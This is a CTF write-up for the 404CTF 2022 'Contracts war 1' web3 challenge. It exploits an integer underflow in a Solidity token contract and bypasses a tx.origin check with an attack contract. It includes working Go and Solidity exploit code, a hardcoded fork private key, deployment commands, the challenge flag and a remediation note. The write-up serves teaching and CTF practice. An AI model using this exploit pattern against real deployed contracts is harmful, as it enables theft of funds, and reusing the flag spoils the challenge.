---
weight: 1
title: "Writeup 404CTF 2022 - Contracts war 1 (web3)"
date: 2023-01-26
tags: ["foundry", "solidity", "golang", "web3", "CTF", "404CTF"]
draft: true
author: "Nodauf"
authorLink: "https://twitter.com/Nodauf"
description: "Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"
images: []
categories: ["Web3"]
resources:
- name: "featured-image-preview"
  src: "404CTF.png"
lightgallery: true

toc:
  auto: false
---
<!--more-->

## Statement

The challenge statement is as follows:

> Agent, nous avons découvert un smart contract de Hallebarde qui permet d'obtenir de l'argent gratuitement. Il sert également à s'authentifier en tant que nouveau membre de Hallebarde. Nous voulons que vous vous fassiez passer pour un de leurs membres. Nous avons récemment trouvé un endpoint qui semble leur servir de portail de connexion. Introduisez-vous dans leur système et récupérez toutes les informations sensibles que vous pourrez trouver.
>
> Contrat à l'adresse : 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6
>
> Réseau de test Ropsten
>
> Auteur : Soremo
>
> nc challenge.404ctf.fr 30885

The source code of the smart contract is given:

```solidity
pragma solidity 0.7.6;

contract FreeMoney {

    mapping (address => uint256) balances;
    mapping(address => uint256) lastWithdrawTime;
    mapping(address => bool) isHallebardeMember;
    address private boss;

    constructor() public {
        boss = msg.sender;
    }

    function getMoney(uint256 numTokens) public {
        require(numTokens < 10000);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 365 days, "Vous devez attendre un an entre chaque demande d'argent.");
        balances[msg.sender] += numTokens;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

    function reset() public {
        balances[msg.sender] = 0;
        lastWithdrawTime[msg.sender] = 0;
    }

    function transfer(address receiver, uint256 numTokens) public returns (bool) {
        require(balances[msg.sender] > 0);
        balances[msg.sender] -= numTokens;
        balances[receiver] += numTokens;
        return true;
    }

    function enterHallebarde() public {
        require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");
        require(msg.sender != tx.origin || boss == msg.sender, "Soyez plus entreprenant !");
        require(!isHallebardeMember[msg.sender]);
        isHallebardeMember[msg.sender] = true;
    }

    function getMembershipStatus(address memberAddress) external view returns (bool) {
        require(msg.sender == memberAddress || msg.sender == boss);
        return isHallebardeMember[memberAddress];
    }
}
```

## Exploitation

The goal of the challenge is to execute the `enterHallebarde()` function without having the transaction being reverted and connect to `challenge.404ctf.fr` on port 30885 to give our address to get the flag.

There are two checks to pass in the `enterHallebarde()` function to succeed:

1. The sender's balance must be greater than 100 ether or the sender is the owner of the contract.
2. The sender must be different from the origin of the transaction or the sender must be the owner of the contract.

### First condition

There are two functions that can increase the balance: `getMoney()` and `transfer()`.

With `getMoney()` you can get only 10000 wei which corresponds to 0.00000000000001 ether ([check with a converter online](https://coinguides.org/ethereum-unit-converter-gwei-ether/)). This function can be called only once a year.

The `transfer()` function can be called to transfer money from the sender to another address. A first check is made to ensure that the sender has more than 0 ether. Then the **sender**'s balance is **decreased** by the amount of money to be transferred. The **recipient**'s balance is **increased** by the amount of money to be transferred. However, the balance is **not compared** to the **number of tokens to be transferred**.

> In the situation where the sender have 1 wei and wants to transfer 2 wei to a random address, what will happen to our uint256 variable?

This is an integer **underflow** vulnerability. Our balance will be egal to the **maximum value of an uint256** which is about **1.15e+59 ether**.

Let's do it!

The environment has to be configured, the [solc](https://github.com/ethereum/solc-bin/blob/gh-pages/linux-amd64/solc-linux-amd64-v0.7.6%2Bcommit.7338295f) binary (version 0.7.6 to match the contract requirements) and [abigen](https://geth.ethereum.org/downloads/) are needed.

```bash
mkdir -p /tmp/challenge/FreeMoney
cd $_
go mod init challenge
cp /tmp/FreeMoney.sol /tmp/challenge/FreeMoney/
solc --abi FreeMoney.sol -o .
abigen --abi=./FreeMoney.abi --pkg=freemoney --out=FreeMoney.go
```

An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.

```bash
npx hardhat node --fork https://ropsten.infura.io/v3/<APIKEY>
#or
anvil --fork-url https://ropsten.infura.io/v3/<APIKEY>
```

And **ctf-freemoney.go**

```go
package main

import (
	"context"
	"crypto/ecdsa"
	freemoney "challenge/FreeMoney"
	"flag"
	"log"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

var fork bool

func main() {
	var blockchainURL, contractAddress, privateKey string
	_ = privateKey
	flag.BoolVar(&fork, "fork", true, "Should we use the parameter for the fork blockchain ? (default: true)")
	flag.Parse()
	contractAddress = "0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6"
	if fork {
		blockchainURL = "http://127.0.0.1:8545"
		privateKey = "59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
	} else {
		blockchainURL = "https://eth-rinkeby.alchemyapi.io/v2/<API-KEY>"
		privateKey = "<PRIVATE-KEY>"
	}

	// Connect to an ethereum node
	client, err := ethclient.Dial(blockchainURL)
	if err != nil {
		log.Fatal(err)
	}

	// Contract
	contractAddressHash := common.HexToAddress(contractAddress)
	instance, err := freemoney.NewFreemoney(contractAddressHash, client)

	// Get 1 wei
	// GetMoney is a write transaction and therefore need to be signed
	auth := newTransactor(client, privateKey)
	_, err = instance.GetMoney(auth, big.NewInt(1))
	if err != nil {
		log.Fatal("fail to get money ", err)
	}

	// Transfer 2 wei to a random address
	// Transfer is a write transaction and therefore need to be signed
	auth = newTransactor(client, privateKey)
	_, err = instance.Transfer(auth, common.HexToAddress("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"), big.NewInt(2))
	if err != nil {
		log.Fatal("fail to get transfer ", err)
	}

	// EnterHallebarde
	// EnterHallebarde is a write transaction and therefore need to be signed
	auth = newTransactor(client, privateKey)
	_, err = instance.EnterHallebarde(auth)
	if err != nil {
		log.Fatal("fail to enterHallebarde", err)
	}
}

// newTransactor creates a transaction signer based on the provided private key
func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts {
	privateKey, err := crypto.HexToECDSA(privateKeyStr)
	if err != nil {
		log.Fatal(err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		log.Fatal("cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)
	nonce, err := client.PendingNonceAt(context.Background(), fromAddress)
	if err != nil {
		log.Fatal(err)
	}

	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		log.Fatal(err)
	}
	//fmt.Println("gasPrice:", gasPrice)
	//fmt.Println("nonce:", nonce)
	auth := bind.NewKeyedTransactor(privateKey)
	auth.Nonce = big.NewInt(int64(nonce))
	auth.Value = big.NewInt(0)                                // in wei
	auth.GasLimit = uint64(20000000)                          // in units
	auth.GasPrice = new(big.Int).Mul(gasPrice, big.NewInt(3)) // Increase gaz to improve speed as our guess depend of the block number
	return auth

}
```

Running the code should generate a revert with the message **Soyez plus entreprenant !**. This means, that we passed the first check that was `require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");`.

### Second condition

To bypass this check, we need to understand **tx.origin** and **msg.sender**. According to the [ethereum whitepaper](https://ethereum.org/en/whitepaper/#ethereum-accounts):

> In general, there are **two types of accounts**: **externally owned accounts**, controlled by private keys, and **contract accounts**, controlled by their contract code.

- **tx.origin** is the address of the **externally owned accounts** (or a wallet) that sent the transaction.
- **msg.sender** is the address of the account from which the call originated. It can be either an **externally owned account** or a **contract account**.

By analogy with network address, **tx.origin** is like an IP address and **msg.sender** is like an **arp address**.

Thus, the condition `msg.sender != tx.origin` means that the transaction must come from a contract account. Basically, we have to do the previous part written in Golang in Solidity. :smile:.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// The interface defining the function in the vulnerable contract that we want to call
interface IFREE_MONEY {
    function enterHallebarde() external;

    function transfer(address receiver, uint256 numTokens) external;

    function getMoney(uint256 numTokens) external;

    function getMembershipStatus(address memberAddress) external returns (bool);
}

contract ContractTest is Test {
    // The target contract
    address public constant FREE_MONEY_CONTRACT =
        0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6;

    // setUp is a foundry function that is not needed here
    function setUp() public {}

    function freeMoneyPwn() public {
        IFREE_MONEY fm = IFREE_MONEY(FREE_MONEY_CONTRACT);
        // Call getMoney with 1 wei
        fm.getMoney(1);

        // Transfer 2 wei to a random address to trigger the underflow vulnerability
        fm.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 2);

        // EnterHallebarde
        fm.enterHallebarde();

        // Check if we are a member, otherwise revert
        require(fm.getMembershipStatus(address(this)), "Not in membership");
    }
}
```

I use [Foundry](https://github.com/foundry-rs/foundry) introduce in the post [Setting up the environment](../setting-up-the-environment/).

The above code can be tested on the fork with the command forge:

```bash
forge run test/FreeMoney.t.sol --fork-url http://127.0.0.1:8545 --sig "freeMoneyPwn()" -vvvv
```

No errors are returned. We can now deploy it on ropsten.

```bash
forge create --rpc-url https://ropsten.infura.io/v3/<API KEY> --private-key <PRIVATE KEY> test/FreeMoney.t.sol:ContractTest
```

```bash
[⠘] Compiling...
[⠃] Compiling 2 files with 0.8.13
[⠢] Compiling 2 files with 0.6.12
[⠑] Solc 0.6.12 finished in 155.95ms
[⠊] Solc 0.8.13 finished in 2.56s
Compiler run successful
Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
Deployed to: 0xbd5a2d122e606ba8e291db4da69fe879fed767e6
Transaction hash: 0xaf1231b3a5144264ac530f5409a5c68ce624c925792469ac29ee027893a66bcf
```

And we can call the `freeMoneyPwn()` function:

```bash
cast send 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 "freeMoneyPwn()" --rpc-url https://ropsten.infura.io/v3/<API KEY>  --private-key <PRIVATE KEY>
```

```
blockHash               0xfed145a41b6b0980fac1c04792951c68b800efcbb837eae7365fc8d87ee37a67
blockNumber             12281762
contractAddress
cumulativeGasUsed       833921
effectiveGasPrice       3000130589
gasUsed                 116832
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0x3f26d603dc17454bd0fa0eb47c120b0e402c526ab1cda862694b53ea53f797ba
transactionIndex        6
type                    2
```

We can use the contract address to validate the challenge:

```text
nc challenge.404ctf.fr 30885

Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass :

Nous allons maintenant vérifier que vous êtes bien un membre.
Veuillez rentrer l'adresse ethereum avec laquelle vous êtes membre :
0xbd5a2d122e606ba8e291db4da69fe879fed767e6
Vérification en cours ...
Bonjour membre, voici la preuve définitive que vous faites partie de Hallebarde :
404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113}
Faites attention, elle ne vous sera délivrée qu'une fois, ne la perdez pas !
```

The golang part was not necessary, but I wanted to show you how to use **golang** to interact with the contract.

## Recommendation

To avoid such vulnerabilities, the safeMath library or the 0.8 branch of the solidity compiler should be used and the `transfer()` function should implement the appropriate `require` function.
